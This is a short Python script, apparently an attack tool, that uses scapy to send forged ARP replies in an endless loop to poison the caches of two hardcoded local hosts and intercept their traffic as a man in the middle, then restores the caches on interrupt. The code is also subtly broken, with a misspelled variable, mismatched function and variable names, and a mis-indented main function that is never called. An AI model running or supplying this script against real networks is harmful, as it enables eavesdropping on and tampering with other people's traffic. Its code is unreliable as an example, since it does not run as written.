#!/usr/bin/python

import scapy.all as scapy

def restore(destination_IP, source_IP):
    target_MAC = get_target_MAC(destination_IP)
    source_MAC = get_target_MAC(source_IP)
    packet = scapy.ARP(op=2, pdst=destination_IP, hwdst=target_MAC, psrc=source_IP, hwsrc=source_MAC)
    scapy.send(packet, verbose=False)

def get_target_MAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = braoadcast/arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)
    
def spoof_ARP(target_IP, spoofed_IP):
    mac = get_target_mac(target_IP)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)
    
def main():
    
first_IP = "192.168.1.1"
second_IP = "192.168.1.5"
    try:
        while True:
            spoof_ARP(first_IP, second_IP)
            spoof_ARP(second_IP, first_IP)
    except KeyboardInterrupt:
        restore(first_IP, second_IP)
        restore(second_IP, first_IP)
        exit(0)
        